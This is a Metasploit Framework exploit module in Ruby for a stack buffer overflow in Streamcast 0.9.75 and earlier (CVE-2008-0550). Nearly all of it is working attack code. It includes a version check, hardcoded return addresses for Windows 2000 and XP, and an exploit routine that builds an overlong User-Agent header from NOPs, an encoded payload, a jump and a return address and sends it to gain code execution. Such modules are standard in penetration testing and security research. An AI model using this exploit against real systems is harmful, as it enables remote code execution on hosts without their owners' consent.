##
# $Id: steamcast_useragent.rb 9488 2010-06-11 16:12:05Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Streamcast <= 0.9.75 HTTP User-Agent Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Streamcast <= 0.9.75. By sending
					an overly long User-Agent in an HTTP GET request, an attacker may be able to
					execute arbitrary code.
			},
			'Author'         => 	[
								'LSO <lso[@]hushmail.com>', # Original exploit module
								'patrick' # Added references and check code. Default target to XP.
							],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 9488 $',
			'References'     =>
				[
					[ 'CVE', '2008-0550' ],
					[ 'OSVDB', '42670' ],
					[ 'URL', 'http://aluigi.altervista.org/adv/steamcazz-adv.txt'],
					# [ 'BID', '' ], # No entry as yet
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' => -3500,
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'DisableNops'  =>  'True',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested OK by patrick 20090225
					[ 'Windows 2000 Pro English All', { 'Ret' => 0x75022ac4 } ],
					[ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ],
				],
			'DisclosureDate' => 'Jan 24 2008',
			'DefaultTarget' => 1))

			register_options([ Opt::RPORT(8000) ], self)
	end

	def check
		connect
		sock.put("GET / HTTP/1.0\r\n\r\n")
		res = sock.get(-1, 3)
		disconnect

		if (res =~ /Steamcast\/0.9.75/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		juju =  "GET / HTTP/1.0\r\n"
		juju << "User-Agent: " + make_nops(1008 - payload.encoded.length)
		juju << payload.encoded + Rex::Arch::X86.jmp_short(6) + make_nops(2)
		juju << [ target.ret ].pack('V') + [0xe8, -850].pack('CV')
		juju <<  rand_text_alpha_upper(275)

		print_status("Trying target #{target.name}...")
		sock.put(juju + "\r\n\r\n")

		handler
		disconnect
	end

end

